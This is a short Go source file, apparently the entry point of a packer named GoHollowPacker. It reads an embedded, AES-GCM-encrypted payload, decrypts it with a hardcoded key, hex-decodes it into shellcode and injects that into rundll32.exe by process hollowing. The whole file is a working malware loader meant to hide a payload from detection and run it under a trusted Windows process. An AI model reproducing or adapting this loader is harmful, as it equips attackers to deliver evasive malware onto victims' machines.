package main

import (
	"crypto/aes"
	"crypto/cipher"
	_ "embed"
	"encoding/hex"
	"github.com/Enelg52/GoHollowPacker/runpe"
)

//https://pkg.go.dev/embed
//go:embed pe.txt
var s string

func main() {
	key := []byte("12345678901234567890123456789044")
	src := "C:\\Windows\\system32\\rundll32.exe"
	console := true
	payload, _ := decrypt([]byte(s), key)
	shellcode, err := hex.DecodeString(string(payload))

	runpe.CheckErr(err)
	runpe.Inject(src, shellcode, console)
}

func decrypt(cypherText []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	runpe.CheckErr(err)
	gcm, err := cipher.NewGCM(block)
	runpe.CheckErr(err)
	plainText, err := gcm.Open(nil, cypherText[:gcm.NonceSize()], cypherText[gcm.NonceSize():], nil)
	runpe.CheckErr(err)
	return plainText, nil
}
